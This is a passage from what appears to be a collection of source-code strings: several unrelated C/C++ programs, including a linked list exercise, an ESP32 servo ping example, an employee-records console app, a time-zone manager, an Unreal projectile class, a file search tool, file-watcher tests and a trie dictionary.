{\r\n                    temp=temp->prev;\r\n\r\n                }\r\n                return temp->val;\r\n            }\r\n            \r\n        }\r\n    }\r\n    void deleteathead()\r\n    {\r\n        if(size==0)cout<<\"list is empty\";\r\n        if(size>=1)\r\n        {\r\n            head=head->next;\r\n            if(head!=NULL)head->prev=NULL;\r\n            if(head==NULL)tail=NULL;\r\n            size--;\r\n        }\r\n    }\r\n    void deleteatend()\r\n    {\r\n        if(size==0)\r\n        {\r\n            cout<<\"list is empty\";\r\n        }\r\n        else if(size==1)\r\n        {\r\n            deleteathead();\r\n            return;\r\n        }\r\n        node* temp=tail->prev;\r\n        temp->next=NULL;\r\n        tail=temp;\r\n        size--;\r\n    }\r\n    void deleteatindex(int idx)\r\n    {\r\n        if(idx==0) deleteathead();\r\n        else if(idx==size-1) deleteatend();\r\n        else if(idx<0 || idx>=size) cout<<\"invalid index\"<<\" \";\r\n        else\r\n        {\r\n            node* temp=head;\r\n            for(int i=1;i<=idx-1;i++)\r\n            {\r\n                temp=temp->next;\r\n\r\n            }\r\n            temp->next=temp->next->next;\r\n            temp->next->prev=temp;\r\n            size--;\r\n\r\n            \r\n        }\r\n    }\r\n};\r\nint main()\r\n{\r\n    dll list;\r\n    list.insertatend(10);\r\n    list.insertatend(20);\r\n    list.insertatend(30);\r\n    list.display();\r\n    list.insertathead(50);\r\n    list.insertatindex(2,40);\r\n    list.display();\r\n    cout<<list.getelement(0);\r\n\r\n\r\n}\r\n    \r\n\r\n\r\n    \r\n    \r\n    \r\n\r\n\r\n",
    "#include \"freertos/FreeRTOS.h\"\n#include \"freertos/task.h\"\n#include \"esp_log.h\"\n#include \"esp_system.h\"\n\n#include \"dynamixel2espressif.h\"\n#include \"actuator.h\"\n\n#define MY_SERVO_ID             3\n#define DXL_PROTOCOL_VERSION    2.0\n#define MY_UART                 UART_NUM_2\n\n/*\n    BEFORE YOU BEGIN:\n\n    1: Run idf.py menuconfig to configure\n       pins for UART TX, RX and DIR:\n       under \"Dynamixel 2 Espressif configuration\"\n    2: Change the value of MY_SERVO_ID to the ID you have given your test servo.\n*/\n\nDynamixel2Espressif dxl(MY_UART, (gpio_num_t)CONFIG_DXL_DIR_PIN);\n\nstatic const char *TAG = \"DXL\";\n\nvoid setup() \n{\n    // Set Port baudrate to 1000000bps. This has to match with DYNAMIXEL baudrate.\n    dxl.begin(1000000);\n    // Set Port Protocol Version. This has to match with DYNAMIXEL protocol version.\n    dxl.setPortProtocolVersion(DXL_PROTOCOL_VERSION);\n}\n\n\nstatic void dxl_task(void *pvParameters)\n{\n    setup();\n\n    while (true )\n    {\n        bool ret = dxl.ping(MY_SERVO_ID);\n        if (ret == 1)\n        {\n            ESP_LOGI(TAG, \"Yay. Got a response from servo with id: %d\", MY_SERVO_ID);\n        }\n        else \n        {\n            ESP_LOGW(TAG, \"Hmm... servo with id: %d seems unresponsive\", MY_SERVO_ID);\n        }\n        vTaskDelay(1000 / portTICK_PERIOD_MS);\n    }\n}\n\nextern \"C\" void app_main(void)\n{\n     xTaskCreate(dxl_task, \"dxl task\", 16384, NULL, 5, NULL);\n\n    while (true) {\n        vTaskDelay(100 / portTICK_PERIOD_MS);\n    }\n}",
    "#include<iostream>\r\n#include<bits/stdc++.h>\r\n#include<stdlib.h>\r\n\r\n#include<string>\r\nusing namespace std;\r\nint i=0;\r\nstruct Employee\r\n{\r\n\tint id;\r\n\tfloat salary;\r\n\tstring name , address,phone,department;\r\n}E[25];\r\nvoid insert()\r\n{\r\n\tsystem(\"cls\");\r\n    cout<<\"\\n\\n INSERT EMPLOYEE RECORD   \";\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE ID->\";\r\n\t\r\n\tcin>>E[i].id;\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE NAME-> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].name);\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE ADDRESS-> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].address);\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE PHONE -> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].phone);\r\n\t\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE DEPARTMENT-> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].department);\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE SALARY-> \";\r\n\t\r\n\tcin>>E[i].salary;\r\n\ti++;\r\n\tcout<<\"\\n\\n ***EMPLOYEE RECORD INSERTED SUCCCESSFULLY ****\";\r\n}\r\nvoid search()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n EMPLOYEE MANAGEMENT SYSTEM\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tint found=0;\r\n\t\tint t_id;\r\n\t\tcout<<\"\\n\\n ENTER EMPLOYEE ID FOR SEARCH-> \";\r\n\t\tcin>>t_id;\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\tif(t_id==E[a].id)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE NAME-> \"<<E[a].name;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE ADDRESS-> \"<<E[a].address;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE PHONE NO.-> \"<<E[a].phone;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE DEPARTMENT -> \"<<E[a].department;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE SALARY-> \"<<E[a].salary;\r\n\t\t\t\tfound++;\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(found==0)\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n ***EMPLOYEE ID NOT FOUND*** \";\r\n\t\t}\r\n\t}\r\n}\r\nvoid update()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n----------------------- EMPLOYEE MANAGEMENT SYSTEM-----------------------\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tint found=0;\r\n\t\tint t_id;\r\n\t\tcout<<\"\\n\\n ENTER EMPLOYEE ID FOR UPDATE-> \";\r\n\t\tcin>>t_id;\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\tif(t_id==E[a].id)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE NAME-> \";\r\n\t\t\t\tcin.ignore();\t\t\t\tgetline(cin,E[a].name);\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE ADDRESS-> \";\r\n\t\t\t\r\n\t\t\t\tgetline(cin,E[a].address);\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE PHONE NO.-> \";\r\n\t\t\t\t\r\n\t\t\t\tcin>>E[a].phone;\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE DEPARTMENT -> \";\r\n\t\t\t\tcin.ignore();\r\n\t\t\t\tgetline(cin,E[a].department);\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE SALARY-> \";\r\n\t\t\t\tcin>>E[a].salary;\r\n\t\t\t\tfound++;\r\n\t\t\t\tcout<<\"\\n\\n *** RECORD UPDATE SUCCESSFULLY ***\";\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(found==0)\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n ***EMPLOYEE ID NOT FOUND*** \";\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid del()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n-------------------- EMPLOYEE MANAGEMENT SYSTEM--------------------\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tint found=0;\r\n\t\tint t_id;\r\n\t\tcout<<\"\\n\\n ENTER EMPLOYEE ID FOR DELETE-> \";\r\n\t\tcin>>t_id;\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\tif(t_id==E[a].id)\r\n\t\t\t{\r\n\t\t\tfor(int k=a;k<i-1;k++)\r\n\t\t\t{\r\n\t\t\t\tE[k].id=E[k+1].id;\r\n\t\t\t\tE[k].name=E[k+1].name;\r\n\t\t\t\tE[k].address=E[k+1].address;\r\n\t\t\t\tE[k].phone=E[k+1].phone;\r\n\t\t\t\tE[k].department=E[k+1].department;\r\n\t\t\t\tE[k].salary=E[k+1].salary;\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\ti--;\r\n\t\t\t\tcout<<\"\\n\\n *** RECORD DELETE  SUCCESSFULLY ***\";\r\n\t\t\t\tfound++;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(found==0)\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n ***EMPLOYEE ID NOT FOUND*** \";\r\n\t\t}\r\n\t}\r\n}\r\nvoid show()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n --------------------EMPLOYEE MANAGEMENT SYSTEM-------------------\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\t\r\n\t\t     \tcout<<\"\\n\\n EMPLOYEE ID -> \"<<E[a].id;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE NAME-> \"<<E[a].name;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE ADDRESS-> \"<<E[a].address;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE PHONE NO.-> \"<<E[a].phone;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE DEPARTMENT -> \"<<E[a].department;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE SALARY-> \"<<E[a].salary;\r\n\t\t\t\tcout<<\"\\n\\n ---------------------------------------\";\r\n\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t\r\n\t\t}\r\n\t\r\n\t}\r\n}\r\nint main()\r\n{\r\n\tp:\r\n\t\r\n\t\r\n\t\tint choice;\r\n\tfor(int i=1;i<=23;i++)\r\n\t{\r\n\t    \r\n\t\r\n\tcout<<\"\\n\\n EMPLOYEE MANAGEMENT SYSTEM\";\r\n\tcout<<\"\\n\\n 1. INSERT EMPLOYEE\";\r\n\tcout<<\"\\n\\n 2. SEARCH EMPLOYEE\";\r\n\tcout<<\"\\n\\n 3. UPDATE EMPLOYEE \";\r\n\tcout<<\"\\n\\n 4. DELETE  EMPLOYEE \";\r\n\tcout<<\"\\n\\n 5. SHOW ALL  EMPLOYEE \";\r\n\tcout<<\"\\n\\n 6. EXIT\";\r\n\tcout<<\"\\n\\n ENTER YOUR CHOICE-> \";\r\n\tcin>>choice;\r\n\t\r\n\tswitch(choice)\r\n\t{\r\n\t\tcase 1:\r\n\t\t\tinsert();\r\n\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tsearch();\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase 3:\r\n\t\t\t\t\tupdate();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 4:\r\n\t\t\t\t\t\tdel();\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase 5:\r\n\t\t\t\t\t\t\tshow();\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\tcase 6:\r\n\t\t\t\t\t\t\t\texit(0);\r\n\t\t\t\t\t\t\t\tdefault:\r\n\t\t\t\t\t\t\t\t\tcout<<\"\\n\\n INVALID OPTION.... PLEASE TRY AGAIN \";\r\n\t\t\t\t\t\t\t\t\t\r\n\t}\r\n\t}\r\n\treturn 0;\r\n\tgoto p;\r\n}\r\n\r\n",
    "#include <Arduino.h>\n#include <WiFi.h>\n#include <HTTPClient.h>\n\n#include \"TimeZoneManager.h\"\n\nPreferences preferences;\n\nvoid TimeZoneManager::set_logger(logger_cb_t logger) {\n  _logger = logger;\n}\n\n\nvoid TimeZoneManager::begin(ClockManager *clock) {\n  _preferences.begin(\"time\", false);\n  String tz = _preferences.getString(\"tz\", \"\");\n  _preferences.end();\n\n  if (tz != \"\") {\n    setenv(\"TZ\", tz.c_str(), 1);\n    tzset();\n    (*_logger)(\"Loaded TZ = %s\", tz.c_str());\n  } else {\n    if (WiFi.status() == WL_CONNECTED) {\n      set_from_api();\n    }\n  }\n\n  clock->set_displayed_time_to_current();\n}\n\nvoid TimeZoneManager::set(String tz) {\n  const char* posix = convert_name(tz.c_str());\n  setenv(\"TZ\", posix, 1);\n  tzset();\n\n  _preferences.begin(\"time\", false);\n  _preferences.putString(\"tz\", String(posix));\n  _preferences.end();\n\n  (*_logger)(\"Set time zone to %s\", tz);\n  (*_logger)(\"TZ = %s\", posix);\n}\n\nvoid TimeZoneManager::set_from_api() {\n  #if ENABLE_WIFI == 1\n  WiFiClient client;\n  HTTPClient http;\n\n  (*_logger)(\"Requesting time zone from ip-api.com\");\n\n  http.begin(client, \"http://ip-api.com/line/?fields=256\");\n  int httpResponseCode = http.GET();\n\n  String payload = \"\";\n  if (httpResponseCode > 0) {\n    payload = http.getString();\n    payload.trim();\n    set(payload);\n  } else {\n    (*_logger)(\"Error code: %s\", httpResponseCode);\n  }\n  http.end();\n  #endif\n}\n\nconst char* TimeZoneManager::convert_name(const char* tzdata) {\n  int offset = 0;\n  const char* current = TIME_ZONE_NAMES;\n  while (strlen(current) > 0) {\n    if (strcmp(tzdata, current) == 0) {\n      const char* posix = TIME_ZONE_STRINGS;\n      while (offset > 0 || strcmp(posix, \"~\") == 0) {\n        posix = posix + strlen(posix) + 1;\n        offset--;\n      }\n      return posix;\n    }\n\n    current = current + strlen(current) + 1;\n    offset++;\n  }\n\n  return \"UTC0\";\n}",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"GameDevProjectile.h\"\n#include \"GameFramework/ProjectileMovementComponent.h\"\n#include \"Components/SphereComponent.h\"\n\nAGameDevProjectile::AGameDevProjectile() \n{\n\t// Use a sphere as a simple collision representation\n\tCollisionComp = CreateDefaultSubobject<USphereComponent>(TEXT(\"SphereComp\"));\n\tCollisionComp->InitSphereRadius(5.0f);\n\tCollisionComp->BodyInstance.SetCollisionProfileName(\"Projectile\");\n\tCollisionComp->OnComponentHit.AddDynamic(this, &AGameDevProjectile::OnHit);\t\t// set up a notification for when this component hits something blocking\n\n\t// Players can't walk on it\n\tCollisionComp->SetWalkableSlopeOverride(FWalkableSlopeOverride(WalkableSlope_Unwalkable, 0.f));\n\tCollisionComp->CanCharacterStepUpOn = ECB_No;\n\n\t// Set as root component\n\tRootComponent = CollisionComp;\n\n\t// Use a ProjectileMovementComponent to govern this projectile's movement\n\tProjectileMovement = CreateDefaultSubobject<UProjectileMovementComponent>(TEXT(\"ProjectileComp\"));\n\tProjectileMovement->UpdatedComponent = CollisionComp;\n\tProjectileMovement->InitialSpeed = 3000.f;\n\tProjectileMovement->MaxSpeed = 3000.f;\n\tProjectileMovement->bRotationFollowsVelocity = true;\n\tProjectileMovement->bShouldBounce = true;\n\n\t// Die after 3 seconds by default\n\tInitialLifeSpan = 3.0f;\n}\n\nvoid AGameDevProjectile::OnHit(UPrimitiveComponent* HitComp, AActor* OtherActor, UPrimitiveComponent* OtherComp, FVector NormalImpulse, const FHitResult& Hit)\n{\n\t// Only add impulse and destroy projectile if we hit a physics\n\tif ((OtherActor != nullptr) && (OtherActor != this) && (OtherComp != nullptr) && OtherComp->IsSimulatingPhysics())\n\t{\n\t\tOtherComp->AddImpulseAtLocation(GetVelocity() * 100.0f, GetActorLocation());\n\n\t\tDestroy();\n\t}\n}",
    "#include <iostream>\n#include <string>\n#include <filesystem>\n#include <vector>\n#include <thread>\n#include <chrono>\n#include <ctime>\nusing namespace std;\nint num = 0;\nbool active = true;\nstring sword = \"your file\";\nstring path = \"your searching path\";\nfloat timeout = 666.0;\nvector<string> exceptions = {\"sys\", \".speech-dispatcher\", \".wine\", \"llvm-14\", \"proc\", \"X11\", \"steam\", \"z:\"};\nvector<string> results;\nvoid checker(){\n    float timet = 0;\n    while(active){\n        this_thread::sleep_for(0.1s);\n        timet += 0.1;\n        if(timet >= timeout){\n            active = false;\n            break;\n        }\n    }\n}\nstring mlower(string str){\n    for(char & stabe : str){\n        stabe = tolower(stabe);\n    }\n    return str;\n}\nbool check_it(string inp, vector<string> inplist){\n    bool h = true;\n    for(string element : inplist){\n        if(mlower(element) == mlower(inp)){\n            return false;\n            h = false;\n            break;\n        }\n    }\n    if(h){return true;}\n}\nvector<string> split_str(string tos, char del){\n    vector<string> re;\n    string h;\n    for(auto& stabe : tos){\n        if(stabe != del){\n        h = h + stabe;}\n        else if(stabe == del){\n            re.push_back(h);\n            h = \"\";\n        }\n    }\n    if(tos[tos.size()] != del){\n        re.push_back(h);\n    }\n    return re;\n}\nstring wend(string str){\n    vector<string> sstr = split_str(str, '.');\n    return sstr[0];\n}\nvoid search_folder(string folder){\n    if(active){\n        try{\n    vector<string> files;\n    vector<string> folders;\n    for (const auto & entry : filesystem::directory_iterator(folder))\n        if(filesystem::is_regular_file(entry)){\n             files.push_back(entry.path().c_str());\n        }\n        else if(filesystem::is_directory(entry)){\n             folders.push_back(entry.path().c_str());\n        }     \n    for(string fpath : files){\n        vector<string> filename  = split_str(fpath, '/');\n        if(mlower(wend(filename[filename.size()-1])) == mlower(wend(sword))){\n            results.push_back(fpath);\n        }\n        num++;\n    }\n    for(string folder : folders){\n        vector<string> foldername = split_str(folder, '/');\n        if(mlower(foldername[foldername.size()-1]) == mlower(wend(sword))){\n            results.push_back(folder);\n            cout<<folder<<endl;}   \n        if(check_it(foldername[foldername.size()-1], exceptions)){\n        search_folder(folder);}\n        cout<<\"\\033[1;35m\"+folder+\"\\033[0m\"<<endl;\n    } }\n    catch(...){\n        ;\n    }}\n}\nint main(){\n    time_t start = time(nullptr);\n    thread t1 = thread(checker);\n    t1.detach();\n    thread t2 = thread(search_folder, path);\n    t2.join();\n    active = false;\n    cout<<\"\\n\\n\\n\\033[1;31mResults:\\033[0m\\n\";\n    for(const string element: results){\n        cout<<\"\\033[1;32m    \"+element+\"\\033[0m\"<<endl;\n    }\n    cout<<\"\\n\";\n    cout<<\"\\033[1;31mEnded searching \"+to_string(num)+\" files \"+to_string(time(nullptr)-start)+\"secs\\033[0m\\n\";\n}\n",
    "// #include \"file_watcher.h\"\n#include \"filewatcher/filewatcher_factory.h\"\n#include <chrono>\n#include <fstream>\n#include <gtest/gtest.h>\n#include <ios>\n#include <thread>\n\n// How long to wait for the callback to be called\n#define THREAD_WAIT_TIME_MS 50\n\n// Helper function to simulate file modification\n\nvoid createFile(const std::string &path, const std::string &content) {\n    std::ofstream file(path);\n    if (file.is_open()) {\n        file << content;\n        file.close();\n    }\n}\n\nvoid appendToFile(const std::string &path, const std::string &content) {\n    std::ofstream file(path, std::ios_base::app);\n    if (file.is_open()) {\n        file << content;\n        file.close();\n    }\n}\n\n// Helper function to simulate file deletion and creation\nvoid replaceFile(const std::string &path, const std::string &content) {\n    std::remove(path.c_str()); // Delete the file\n    createFile(path, content); // Create a new file with content\n}\n\nclass FileWatcherTest : public ::testing::Test {\n  protected:\n    // Our test file\n    std::string testFilePath = \"testfile.txt\";\n    // A different file just to make sure we only care about test file\n    std::string differentFilePath = \"differenttestfile.txt\";\n\n    virtual void SetUp() {\n        std::remove(testFilePath.c_str());\n        std::remove(differentFilePath.c_str());\n    }\n\n    virtual void TearDown() {\n        std::remove(testFilePath.c_str());\n        std::remove(differentFilePath.c_str());\n    }\n};\n\nTEST_F(FileWatcherTest, NoChangeCallbackNotCalled) {\n    bool callbackCalled = false;\n    auto callback = [&callbackCalled]() { callbackCalled = true; };\n    createFile(testFilePath, \"New content\");\n    createFile(differentFilePath, \"Different content\");\n\n    auto watcher = filewatcher_factory::createFileWatcher();\n    watcher->startWatching(testFilePath, callback);\n    appendToFile(differentFilePath, \"New content\");\n    std::this_thread::sleep_for(std::chrono::milliseconds(THREAD_WAIT_TIME_MS));\n    watcher->stopWatching();\n\n    EXPECT_FALSE(callbackCalled);\n}\n\nTEST_F(FileWatcherTest, FileModifiedCallbackCalled) {\n    bool callbackCalled = false;\n    auto callback = [&callbackCalled]() { callbackCalled = true; };\n    createFile(testFilePath, \"New content\");\n\n    auto watcher = filewatcher_factory::createFileWatcher();\n    watcher->startWatching(testFilePath, callback);\n    std::this_thread::sleep_for(std::chrono::milliseconds(THREAD_WAIT_TIME_MS));\n    appendToFile(testFilePath, \"New content\");\n    std::this_thread::sleep_for(std::chrono::milliseconds(THREAD_WAIT_TIME_MS));\n    watcher->stopWatching();\n\n    EXPECT_TRUE(callbackCalled);\n}\n\nTEST_F(FileWatcherTest, FileDeletedAndReplacedCallbackCalled) {\n    bool callbackCalled = false;\n    auto callback = [&callbackCalled]() { callbackCalled = true; };\n    createFile(testFilePath, \"New content\");\n\n    auto watcher = filewatcher_factory::createFileWatcher();\n    watcher->startWatching(testFilePath, callback);\n    std::this_thread::sleep_for(std::chrono::milliseconds(THREAD_WAIT_TIME_MS));\n    replaceFile(testFilePath, \"Replacement content\");\n    std::this_thread::sleep_for(std::chrono::milliseconds(THREAD_WAIT_TIME_MS));\n    watcher->stopWatching();\n\n    EXPECT_TRUE(callbackCalled);\n}\n\nTEST_F(FileWatcherTest, FileReplacedMultipleTimesCallbackCalled) {\n    int callbackCount = 0;\n    auto callback = [&callbackCount]() { callbackCount++; };\n\n    createFile(testFilePath, \"New content\");\n    auto watcher = filewatcher_factory::createFileWatcher();\n    watcher->startWatching(testFilePath, callback);\n    std::this_thread::sleep_for(std::chrono::milliseconds(50));\n    for (int i = 0; i < 10; ++i) {\n        replaceFile(testFilePath, \"Content \" + std::to_string(i));\n        std::this_thread::sleep_for(\n            std::chrono::milliseconds(50)); // Wait a bit between replacements\n    }\n    watcher->stopWatching();\n\n    EXPECT_GE(callbackCount, 10); // Ensure callback was called at least once\n}\n",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdbool.h>\n\n#define CHAR_SIZE 256\nint count = 1;\nchar word[101];\n\nstruct trieNode{\n\tstruct trieNode *children[CHAR_SIZE];\n\tbool isEndOfWorld;\n\tchar desc[100];\n};\n\nstruct trieNode *createNode(){\n\tstruct trieNode *node = (struct trieNode*)malloc(sizeof(struct trieNode));\n\t\n\tif(node){\n\t\tnode->isEndOfWorld = false;\n\t\t\n\t\tfor(int i = 0; i < CHAR_SIZE; i++){\n\t\t\tnode->children[i] = NULL;\n\t\t}\n\t}\n\t\n\treturn node;\n}\n\nvoid insert(struct trieNode *root, char *key){\n\tstruct trieNode *current = root;\n\t\n\tint length = strlen(key);\n\t\n\tfor(int i = 0; i < length; i++){\n\t\tint index = key[i] - 'A';\n\t\t\n\t\tif(!current->children[index]){\n\t\t\tcurrent->children[index] = createNode();\n\t\t}\n\t\t\n\t\tcurrent = current->children[index];\n\t}\n\t\n\tcurrent->isEndOfWorld = true;\n}\n\nbool search(struct trieNode *root, char *key){\n\tstruct trieNode *current = root;\n\tint length = strlen(key);\n\t\n\tfor(int i = 0; i < length; i++){\n\t\tint index = key[i] - 'A';\n\t\t\n\t\tif(!current->children[index]){\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tcurrent = current->children[index];\n\t}\n\t\n\treturn (current != NULL && current->isEndOfWorld);\n}\n\nvoid printTrie(struct trieNode *root, char *buffer, int depth){\n\tbool hasWords = false;\n\t\n\tif(root->isEndOfWorld){\n\t\thasWords = true;\n\t\t\n\t\tif(count == 1){\n\t\t\tprintf(\"List of all slang words in the dictionary:\\n\");\n\t\t}\n\t\t\n\t\tbuffer[depth] = '\\0';\n\t\tprintf(\"%d. %s\\n\",count, buffer);\n\t\tcount++;\n\t}\n\t\n\tfor(int i = 0; i < CHAR_SIZE; i++){\n\t\tif(root->children[i] != NULL){\n\t\t\tbuffer[depth] = i + 'A';\n\t\t\tprintTrie(root->children[i], buffer, depth + 1);\n\t\t\thasWords = true;\n\t\t}\n\t}\n\t\n\tif(!hasWords){\n\t\tprintf(\"There is no slang words yet in the dictionary.\\n\");\n\t}\n}\n\nvoid printTrieWithPrefix(struct trieNode *root, char *prefix, char *buffer, int depth){\n\tbool hasWords = false;\n\t\n\tif(root->isEndOfWorld){\n\t\thasWords = true;\n\t\t\n\t\tif(count == 1){\n\t\t\tprintf(\"List of all slang words in the dictionary:\\n\");\n\t\t}\n\t\t\n\t\tbuffer[depth] = '\\0';\n\t\tprintf(\"%d. %s%s\\n\",count, prefix, buffer);\n\t\tcount++;\n\t}\n\t\n\tfor(int i = 0; i < CHAR_SIZE; i++){\n\t\tif(root->children[i] != NULL){\n\t\t\tbuffer[depth] = i + 'A';\n\t\t\tprintTrieWithPrefix(root->children[i], prefix, buffer, depth + 1);\n\t\t\thasWords = true;\n\t\t}\n\t}\n\t\n\tif(!hasWords){\n\t\tprintf(\"There is no prefix \\\"%s\\\" in the dictionary.\\n\", prefix);\n\t}\n}\n\nvoid searchPrefix(struct trieNode *root, char *prefix){\n\tstruct trieNode *current = root;\n\tint length = strlen(prefix);\n\tchar buffer[100];\n\t\n\tfor(int i = 0; i < length; i++){\n\t\tint index = prefix[i] - 'A';\n\t\t\n\t\tif(current->children[index] == NULL){\n\t\t\tprintf(\"There is no prefix \\\"%s\\\" in the dictionary.\\n\", prefix);\n\t\t\treturn;\n\t\t}\n\t\tcurrent = current->children[index];\n\t}\n\t\n\tprintf(\"Words starting with \\\"%s\\\": \\n\", prefix);\n\tprintTrieWithPrefix(current, prefix, buffer, 0);\n}\n\nvoid menu(){\n\tsystem(\"cls\");\n\tputs(\"1. Release a new slang word\");\n\tputs(\"2. Search a slang word\");\n\tputs(\"3. View all slang words starting with a certain prefix word\");\n\tputs(\"4. View all slang words\");\n\tputs(\"5. Exit\");\n\tprintf(\">> \");\n}\n\nint main(){\n\tstruct trieNode *root = createNode();\n\t\n\tint choice;\n\tchar desc[100], searchWord[100], searchPrefix1[100];\n\t\n\twhile(true){\n\t\tmenu();\n\t\tscanf(\"%d\", &choice);\n\t\t\n\t\tswitch(choice){\n\t\t\tcase 1:{\n\t\t\t\tdo{\n\t\t\t\t\tprintf(\"Input a new slang word [Must be more than 1 characters and contains no space]: \");\n\t\t\t\t\tscanf(\"%s\", word); getchar();\n\t\t\t\t\t\n\t\t\t\t\tif(search(root, word)){\n\t\t\t\t\t\tprintf(\"Input a new slang word description [Must be more than 2 words]: \");\n\t\t\t\t\t\tscanf(\"%s\", desc); getchar();\n\t\t\t\t\t\tinsert(root, desc);\n\t\t\t\t\t}\t\n\t\t\t\t\t\n\t\t\t\t} while(strlen(word) <= 1 && strchr(word, ' ') == 0);\n\t\t\t\t\n\t\t\t\tinsert(root, word);\n\t\t\t\t\n\t\t\t\tprintf(\"Succesfully released new slang word.\\n\");\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 2:{\n\t\t\t\tprintf(\"Input a slang word to be searched [Must be more than 1 characters and contains no space]: \");\n\t\t\t\tscanf(\"%s\", searchWord); getchar();\n\t\t\t\t\n\t\t\t\tif(!search(root, searchWord)){\n\t\t\t\t\tprintf(\"There is no word '%s' in the dictionary.\\n\", searchWord);\n\t\t\t\t} else {\n\t\t\t\t\tprintf(\"Slang word: %s\\n\", searchWord);\n\t\t\t\t\tprintf(\"Description: %s\\n\", desc);\n\t\t\t\t}\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 3:{\n\t\t\t\tprintf(\"Input a prefix to be searched: \");\n\t\t\t\tscanf(\"%s\", searchPrefix1); getchar();\n\t\t\t\t\n\t\t\t\tsearchPrefix(root, searchPrefix1);\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 4:{\n\t\t\t\tcount = 1;\n\t\t\t\tchar buffer[100];\n\t\t\t\tprintTrie(root, word, 0);\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 5:{\n\t\t\t\tprintf(\"Thank you... Have a nice day :)\\n\");\n\t\t\t\treturn 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t\n\treturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"api\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  